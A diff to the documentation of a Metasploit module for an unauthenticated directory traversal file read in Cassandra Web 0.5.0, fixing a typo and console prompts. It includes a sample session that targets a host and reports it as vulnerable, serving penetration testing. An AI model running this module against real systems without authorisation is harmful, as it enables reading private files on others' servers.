@@ -9,7 +9,7 @@ This module has been tested successfully on Cassandra Web versions:
 
 This module exploits an unauthenticated directory traversal vulnerability in Cassandra Web
 'Cassandra Web' version 0.5.0 and earlier, allowing arbitrary file read with the web server privileges.
-This vulnerability occured due to the disabled Rack::Protection module.
+This vulnerability occurred due to the disabled Rack::Protection module.
 
 This web service listens on TCP port 3000 by default on all network interface.
 
@@ -55,10 +55,10 @@ cassandra-web
 ## Scenarios
 ### Cassandra Web 0.5.0 Linux Debian 10.11 (Ruby 2.5.5p157 and Apache Cassandra 3.11.13)
 ```
-msf6 > use auxiliary/scanner/http/cassandra_web_file_read
-msf6 auxiliary(scanner/http/cassandra_web_file_read) > set RHOSTS 192.168.56.1
+msf > use auxiliary/scanner/http/cassandra_web_file_read
+msf auxiliary(scanner/http/cassandra_web_file_read) > set RHOSTS 192.168.56.1
 RHOSTS => 192.168.56.1
-msf6 auxiliary(scanner/http/cassandra_web_file_read) > run
+msf auxiliary(scanner/http/cassandra_web_file_read) > run
 
 [*] Running automatic check ("set AutoCheck false" to disable)
 [+] The target appears to be vulnerable. Cassandra Web Detected
